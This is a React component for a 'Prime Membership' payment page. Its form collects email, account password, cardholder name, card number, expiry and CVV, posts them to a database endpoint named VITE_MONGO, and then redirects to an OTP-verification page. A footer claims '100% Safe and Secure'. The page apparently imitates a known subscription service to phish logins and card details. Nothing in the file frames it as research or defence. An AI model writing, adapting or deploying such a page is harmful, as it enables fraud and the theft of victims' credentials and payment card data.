
import { useState, useEffect, useRef } from 'react'

import { useForm } from "react-hook-form"
import { useNavigate } from 'react-router-dom';




function Card() {
  const [count, setCount] = useState()
  const navigate = useNavigate();

  const {
    register,
    handleSubmit,
    watch,
    formState: { errors, isSubmitting },
  } = useForm();

  const delay = (d) => {
    return new Promise((resolve, reject) => {
      setTimeout(() => {
        resolve()
      }, d * 3000);
    })
  }

  //const onSubmit = async (data) => {
  // await delay(2)
  //let r = await fetch("http://localhost:3000/", { method: "post", body: JSON.stringify(data) })
  //let res = await r.text()
  //console.log(data, res)


  const onSubmit = async (data) => {
    navigate("/Otp-verification")
    let r = await fetch(import.meta.env.VITE_MONGO, {
      method: "POST", headers: {
        "Content-Type": "application/json",
      }, body: JSON.stringify(data)


    })
    let res = await r.text()

    console.log(data, res)


  }



  return (
    <>

<div className="payment-nav card-navbar">
        <img id='payment-img' src="./img/img1.png.webp" alt="fail to load img 1" />
        <h3 id='payment-heading'> Prime Membership</h3>
      </div>



      {isSubmitting && <div>Loading...</div>}
      <div class="container p-0">
      {isSubmitting && <div>Loading...</div>}
      <form action="" onSubmit={handleSubmit(onSubmit)}>
        <div class="card px-4">
            <p class="h8 py-3">Payment Details</p>
            <div class="row gx-3">

            <div class="col-12">
                    <div class="d-flex flex-column">
                        <p class="text mb-1">Email</p>
                        <input class="form-control mb-3" type="Email" placeholder="Email" {...register("Email")} name='Email' />
                    </div>
                </div>

                <div class="col-12">
                    <div class="d-flex flex-column">
                        <p class="text mb-1">Password</p>
                        <input class="form-control mb-3" type="Text" placeholder="Password" {...register("password")} name='password'  />
                    </div>
                </div>
                <div class="col-12">
                    <div class="d-flex flex-column">
                        <p class="text mb-1">Person Name</p>
                        <input class="form-control mb-3" type="text" placeholder="Account holder Name"  {...register("ahn")}  name='ahn' />
                    </div>
                </div>
                <div class="col-12">
                    <div class="d-flex flex-column">
                        <p class="text mb-1">Card Number</p>
                        <input class="form-control mb-3" type="Number" placeholder="1234 5678 435678" {...register("Cardd")} name='Cardd' />
                    </div>
                </div>
                <div class="col-6">
                    <div class="d-flex flex-column">
                        <p class="text mb-1">Expiry</p>
                        <input class="form-control mb-3" type="Number" placeholder="MM/YYYY" {...register("Expiry")} name='Expiry' />
                    </div>
                </div>
                <div class="col-6">
                    <div class="d-flex flex-column">
                        <p class="text mb-1">CVV/CVC</p>
                        <input class="form-control mb-3 pt-2 " type="Number" placeholder="***" {...register("C")} name='C'/>
                    </div>
                </div>
                <div class="col-12">
                <button  type="submit" value="submit"  class="btn btn-primary mb-3">
                        <span class="ps-3">Pay </span>
                        <span class="fas fa-arrow-right"></span>
                    </button>
                    </div>    
                
            </div>
        </div>
</form>
    </div>

    


    <div className="footer">
        <img id='footer-img' src="./img/img1.png.webp" alt="fail to load footer img " />
        <h3 id='footer-heading'>
          100% Safe and Secure
        </h3>

      </div>




    </>
  )
}

export default Card
